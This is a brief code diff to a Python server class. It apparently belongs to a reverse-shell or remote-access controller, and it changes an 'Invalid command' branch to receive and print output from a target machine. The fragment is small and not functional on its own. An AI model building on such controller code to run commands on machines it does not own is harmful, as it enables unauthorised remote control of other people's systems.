@@ -206,7 +206,9 @@ class Server:
                         print(help.HELP_TARGET_COMS)
 
                   else:
-                        print("Invalid command")
+                        # Reverse shell
+                        out = recv(target)
+                        print(out)
 
       # Execute a command on the server
       def shell(self):
